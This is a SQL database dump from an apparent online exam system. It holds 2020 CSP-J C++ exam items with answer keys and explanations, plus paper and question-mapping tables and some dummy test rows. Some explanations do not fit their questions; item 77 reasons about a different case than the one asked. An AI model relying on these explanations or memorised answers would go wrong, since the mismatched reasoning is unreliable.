INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (75, '<p>若 k&gt;1,则输出 ans 时,len 一定大于n</p>', NULL, 73, '', '', '', '', '错误', '因为 ans 记录的是进位的次数，所以当输入的数小于 k 进制的时候，是不用进位的，ans 的值为 0，而此时 len 的值为 1', 1, 1, 0, 'test', '2023-11-04 21:39:22', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (76, '<p>若 k&gt;1,则输出 ans 时,k^len一定大于n</p>', NULL, 73, '', '', '', '', '正确', '由进制的性质可以得到，n 转化成 k 进制最高位为 k^(len-1),而 k^len 显然大于它', 1, 1, 0, 'test', '2023-11-04 21:40:58', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (77, '<p>若输入的 n 等于 10d的15次方，输入的 k 为 1,则输出等于（）</p>', NULL, 73, '(10^30-10^15)/2', '(10^30+10^15)/2', '1', '10^15', 'A', '当 n=3^30， k = 3 时，转化后的三进制一共有 31 位，最高位为 1，其它均为 0，\n第二高位要进位到最高位需要 1 次进位，第三高位进位到第二高位需要 3 次进位，第四到第三需要 9 次，一次类推，所以最后的可得总进位为：1 + 3 + 9 + ...+3^29 = 1*(1 - 3^30)/(1-3) =(3^30-1)/2，即等比数列求和公式，选 A。', 0, 1, 0, 'test', '2023-11-04 21:42:51', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (78, '<p>若输入的 100,010,002,000,090,输入的 k 为 10,则输岀等于</p>', NULL, 73, '11.112.222.444.543', '11.122.222.444.543', '11.122.222.444.453', '11.112.222.444.453', 'D', '即求十进制从 1 加到 100010002000090 需要进位多少次，进行分步处理：\n第一，加到 10^14 次方，需要(10^14-1)/9 = 1111111111111 次\n第二，加到 10^10 次方，需要(10^10-1)/9 = 111111111 次\n第三，加到 2*10^6 次方，需要 2*(10^6-1)/9 = 22222 次\n第四，加到 90，需要 9 次\n累加:1111111111111 + 111111111 + 22222 + 9 = 1111222244453 即选项 D。', 0, 1, 0, 'test', '2023-11-04 21:44:31', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (79, NULL, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/12_20231104214531A014.png\"></p><p>假设输入的 n 是不超过 5。的正整数，d[i][0]，d[i][1]都是不超过 10000 的正整数，完成下面的判断题和单选题：</p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-11-04 21:45:48', 'test', '2023-11-04 21:46:18', '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (80, '<p>若输入 n 为 0,此程序可能会死循环或发生运行错误。（）</p>', NULL, 79, '', '', '', '', '错误', '当 n 为 0 的时候，dfs 函数内部仅运行一次，可以正常结束', 1, 1, 0, 'test', '2023-11-04 21:46:45', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (81, '<p>若输入 n 为 20,接下来的输入全为 0,则输岀为0</p>', NULL, 79, '', '', '', '', '正确', '可以带入 n 较小全为 0 的情况', 1, 1, 0, 'test', '2023-11-04 21:47:10', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (82, '<p>输出的数一定不小于输入的 d[i][0]和 d[i][1]的任意一个</p>', NULL, 79, '', '', '', '', '错误', '带入特例 1 1 1,得 ans 为 0', 1, 1, 0, 'test', '2023-11-04 21:47:59', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (83, '<p>若输入的 n 为 20,接下来的输入是 20 个 9 和 20 个 0,则输出为（）</p>', NULL, 79, '1917', '1980', '1881', '1890', 'C', '可以尝试从 n 较小的情况模拟，可得规律为 ans = (2 + n) / 2 * (n – 1) *9', 0, 1, 0, 'test', '2023-11-04 21:49:14', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (84, '<p>若输入的 n 为 30,接下来的输入是 30 个。和 30 个 5,则输出为（）。</p>', NULL, 79, '2020', '2030', '2010', '2000', 'B', '可以尝试从 n 较小的情况模拟，可得规律为 ans = (n - 1) / 2 * (n – 2) * 5', 0, 1, 0, 'test', '2023-11-04 21:50:04', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (85, '<p>若输入的 n 为 15,接下来的输入是 15 到 1,以及 15 到1 输出为</p>', NULL, 79, '2420', '2220', '2440', '2240', 'D', '通过模拟易得', 0, 1, 0, 'test', '2023-11-04 21:51:10', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (86, NULL, '<p>给出正整数 n,请输出将 n 质因数分解的结果，结果从小 倒 j 大输出。</p><p>例如：输入 n=120,程序应该输出 2 2 2 3 5,表示 120=2 X 2 X 2 X 3 X 5。输入保证 2≤n ≤10^9。提示：先从小到大枚举变量 i,然后用 i 不停试除 n 来寻找所有的质因子。试补全程序</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/1 (2)_20231104215413A017.png\"></p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/2_20231104215330A016.png\"></p><p><br></p>', -1, '', '', '', '', '', NULL, -1, 2, 0, 'test', '2023-11-04 21:54:31', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (87, '<p>①处应填</p>', NULL, 86, 'n-1', '0', '1', '2', 'D', '枚举质因子从 2 开始', 0, 2, 0, 'test', '2023-11-04 21:55:24', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (88, '<p>②处应填（）</p>', NULL, 86, 'n/i', 'n/(i*i)', 'i*i*i', 'i*i', 'D', ' 一个数最多只存在一个大于 sqrt(n)的质因子，因为当存在两个这样的质因子时，它们相乘必然会大于 n，故枚举质因子时，可以先枚举小于等于 sqrt(n)的部分，将这部分因子全除去后，若 n 还不为 1，则此时 n 为最后一个质因子。', 0, 2, 0, 'test', '2023-11-04 21:56:30', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (89, '<p>③处应填（）</p>', NULL, 86, 'if(i * i<=n)', 'if(n % i == 0)', 'while(i *i <=n)', 'while(n % i =0)', 'D', '将该质因子除尽', 0, 2, 0, 'test', '2023-11-04 21:57:54', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (90, '<p>④处应填（）</p>', NULL, 86, 'n>1', 'n<1', 'i+i<n', 'i<n/i', 'A', '同 2）理', 0, 2, 0, 'test', '2023-11-04 21:59:08', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (91, '<p>⑤处应填（）</p>', NULL, 86, '2', 'i', 'n/i', 'n', 'D', '同 2）理', 0, 2, 0, 'test', '2023-11-04 21:59:38', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (92, NULL, '<p>(最小区间覆盖）给出 n 个区间，第 i 个区间的左右端点是［ai，bi］.现在要在这些区间中选出若干个，使得区间［0, m］被所选区间的并覆盖（即每 一个 0≤1≤m 都在某个所选的区间中）。保证答案存在，求所选区间个数的最小值。输入第一行包含两个整数 n 和 m (1≤n≤5000,1≤m≤10^9)接下来 n 行，每行两个整数击，bi （0&lt;ai, bi≤m）。</p><p>提示：使用贪心法解决这个问题。先用 9（n^2）的时间复杂度排序，然后贪心 选择这些区间。</p><p>试补全程序。</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/3_20231104220153A018.png\"></p>', -1, '', '', '', '', '', NULL, -1, 2, 0, 'test', '2023-11-04 22:02:04', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (93, '<p>①处应填（）</p>', NULL, 92, 'A[j].b < A[j - 1].b', ' A[j].b > A[j - 1].b', 'A[j].a < A[j - 1.a', 'A[j].a > A[j-1].a', 'C', '按照左端点从小到大排序', 0, 2, 0, 'test', '2023-11-04 22:03:51', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (94, '<p>②处应填（）</p>', NULL, 92, ' A[j-1] ] = A[j]; A[j] = t;', ' A[j+1] = A[j]; A[j] = t;', ' A[j]= A[j-1]；A[j-1] = t;', ' A[j]= A[j+1]；A[j+1] = t;', 'C', '冒泡排序中的交换左右元素的步骤', 0, 2, 0, 'test', '2023-11-04 22:05:33', 'test', '2023-11-04 22:07:01', NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (95, '<p>③处应填（）</p>', NULL, 92, ' A[i].b < A[p-1].b', ' A[i].b > A[i-1].b', ' A[i].b > A[p-1].b', ' A[i].b < A[i-1].b', 'C', ' 当按照左端点从小到大排序的时候，当前这一段只有在右端点是超过上一段的右端点的时候，这一段才是有意义的，否则上一段完全可以取代这一段（即这一段是被上一段完全覆盖的），即忽略掉。', 0, 2, 0, 'test', '2023-11-04 22:06:46', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (96, '<p>④处应填（）</p>', NULL, 92, 'q+1<n && A[q+1].b<=r', ' q+1<n && A[q+1].a<=r', ' q<n && A[q].a<=r', ' q<n && A[q].b<=r', 'B', ' 首先注意 A 数组是从 1 开始的，而 q 的初始值为 0。然后我们需要选择左端点在当前覆盖范围的内的区间，不然会有间隙，不符合题目条件。综上，选择 B。', 0, 2, 0, 'test', '2023-11-04 22:08:13', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (97, '<p>⑤处应填（）</p>', NULL, 92, ' r = max（r,A[q + 1].a）', ' r = max（r,A[q].b）', ' r = max（r,A[q + 1].b）', ' q++', 'B', ' 根据 while 循环条件可得当前 q + 1 是不符合条件的区间，所以 q 是最后一个满足左端点在已覆盖范围，且右端点最大的区间。', 0, 2, 0, 'test', '2023-11-04 22:09:30', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (98, '<p><img src=\"null:null/profile/upload/2023/11/09/1425_20231109213457A001.png\"></p>', NULL, -1, 'aaa', 'bbb', 'bbb', 'bbb', 'B', '12', 0, 0, 1, 'admin', '2023-11-09 21:39:32', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (99, '<p><img src=\"null:null/profile/upload/2023/11/09/1425_20231109213457A001.png\"></p>', NULL, -1, 'aaa', 'bbb', 'bbb', 'bbb', 'B', '12', 0, 0, 1, 'admin', '2023-11-09 21:41:29', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (100, '<p><img src=\"null:null/profile/upload/2023/11/09/1425_20231109213457A001.png\"></p>', NULL, -1, 'aaa', 'bbb', 'bbb', 'bbb', 'B', '12', 0, 0, 1, 'admin', '2023-11-09 21:44:24', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (101, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/09/1425_20231109214717A001.png\"></p>', NULL, -1, 'a', 's', 'a', 's', 'A', NULL, 0, 0, 1, 'admin', '2023-11-09 21:47:48', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (102, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/09/1425_20231109214717A001.png\"></p>', NULL, -1, 'a', 's', 'a', 's', 'A', NULL, 0, 0, 1, 'admin', '2023-11-09 21:48:31', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (103, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/10/logo_20231110105424A001.png\"></p>', NULL, -1, 'a s d', 'asd', 'sad', 'asd', 'C', 'asd', 0, 0, 1, 'admin', '2023-11-10 10:54:30', '', NULL, 'asd');
COMMIT;

-- ----------------------------
-- Table structure for tb_paper
-- ----------------------------
DROP TABLE IF EXISTS `tb_paper`;
CREATE TABLE `tb_paper` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `paper_name` varchar(128) DEFAULT '' COMMENT '试卷名称',
  `is_delete` tinyint DEFAULT '0' COMMENT '是否删除 0:否 1:是',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci COMMENT '备注',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='试卷表（存放生成的试卷）';

-- ----------------------------
-- Records of tb_paper
-- ----------------------------
BEGIN;
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '测试试卷', 1, 'admin', '2023-11-01 08:43:02', 'admin', '2023-11-01 21:40:36', '这是一条备注123');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '213', 1, 'admin', '2023-11-01 14:45:42', '', NULL, '123');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, '12', 1, 'admin', '2023-11-02 19:56:57', '', NULL, '3');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (4, '123', 1, 'admin', '2023-11-02 19:59:19', '', NULL, '1');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (5, '121111', 1, 'admin', '2023-11-02 19:59:55', '', NULL, '3');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (6, '12', 1, 'admin', '2023-11-02 21:32:54', '', NULL, 'aa');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (7, '测试试卷展示', 1, 'admin', '2023-11-03 08:49:58', '', NULL, '123321');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (8, '测试考试试卷', 0, 'admin', '2023-11-06 10:06:33', '', NULL, '此试卷用于测试考试功能');
INSERT INTO `tb_paper` (`id`, `paper_name`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (9, '调试在线考试', 0, 'admin', '2023-11-06 18:48:18', '', NULL, '此试卷用于调试在线考试');
COMMIT;

-- ----------------------------
-- Table structure for tb_paper_exercise
-- ----------------------------
DROP TABLE IF EXISTS `tb_paper_exercise`;
CREATE TABLE `tb_paper_exercise` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `paper_id` bigint DEFAULT '0' COMMENT '试卷id',
  `exercise_id` bigint DEFAULT '0' COMMENT '题目id',
  `score` int DEFAULT '0' COMMENT '题目分数',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=97 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='试卷-题目映射表';

-- ----------------------------
-- Records of tb_paper_exercise
-- ----------------------------
BEGIN;
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (1, 3, 3, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (2, 3, 31, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (3, 3, 29, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (4, 3, 33, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (5, 3, 27, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (6, 3, 1, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (7, 3, 30, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (8, 3, 86, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (9, 3, 4, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (10, 3, 95, 9);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (11, 3, 82, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (12, 3, 83, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (13, 4, 28, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (14, 4, 86, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (15, 4, 2, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (16, 4, 33, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (17, 4, 95, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (18, 4, 29, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (19, 4, 32, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (20, 4, 1, 20);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (21, 4, 118, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (22, 5, 4, 100);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (23, 6, 5, 100);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (24, 6, 92, 95);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (25, 6, 100, 1);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (26, 6, 101, 1);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (27, 6, 102, 1);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (28, 6, 103, 1);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (29, 6, 104, 1);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (30, 7, 33, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (31, 7, 118, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (32, 7, 86, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (33, 7, 27, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (34, 7, 3, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (35, 7, 2, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (36, 7, 32, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (37, 7, 30, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (38, 7, 29, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (39, 7, 95, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (40, 7, 5, 30);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (41, 7, 92, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (42, 7, 100, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (43, 7, 101, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (44, 7, 102, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (45, 7, 103, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (46, 7, 104, 5);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (47, 7, 73, 20);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (48, 7, 74, 20);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (49, 8, 57, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (50, 8, 18, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (51, 8, 55, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (52, 8, 62, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (53, 8, 63, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (54, 8, 20, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (55, 8, 21, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (56, 8, 12, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (57, 8, 8, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (58, 8, 65, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (59, 8, 56, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (60, 8, 19, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (61, 8, 14, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (62, 8, 59, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (63, 8, 60, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (64, 8, 13, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (65, 8, 9, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (66, 8, 52, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (67, 8, 54, 2);
